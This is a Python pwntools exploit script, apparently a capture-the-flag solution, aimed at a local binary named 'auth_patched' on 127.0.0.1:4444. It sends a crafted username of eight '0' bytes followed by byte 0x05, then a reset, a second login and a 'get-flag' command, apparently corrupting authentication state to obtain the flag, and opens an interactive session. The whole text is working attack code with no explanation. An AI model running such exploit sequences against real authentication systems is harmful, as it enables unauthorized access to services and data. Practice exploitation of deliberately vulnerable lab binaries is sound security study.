#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/auth_patched"
TARGET = DIR + EXECUTABLE
HOST, PORT = "127.0.0.1", 4444
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
rop = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][1],
    terminal = ['tmux', 'new-window'],
)
context.binary = elf

io, libc = null, null
libc = ELF("/usr/lib/libc.so.6")

if args.REMOTE:
    REMOTE = True
    io = remote(HOST, PORT)
else:
    LOCAL = True
    io = process(
        [TARGET, ],
    )

if LOCAL==True:
    #raw_input("Fire GDB!")
    if len(sys.argv) > 1 and sys.argv[1] == "d":
        cmd = """ 
            #break *main
        """
        gdb.attach(io, gdbscript=cmd)

# ==========================[ Exploit
print(io.recvrepeat(1))

username = b'0'*8 + b'\x05'
io.sendline(b"login " + username)
io.sendline(b"reset")
io.sendline(b"login testtest")
io.sendline(b"show")
io.sendline(b"get-flag")
io.sendline(b"quit")
io.interactive()

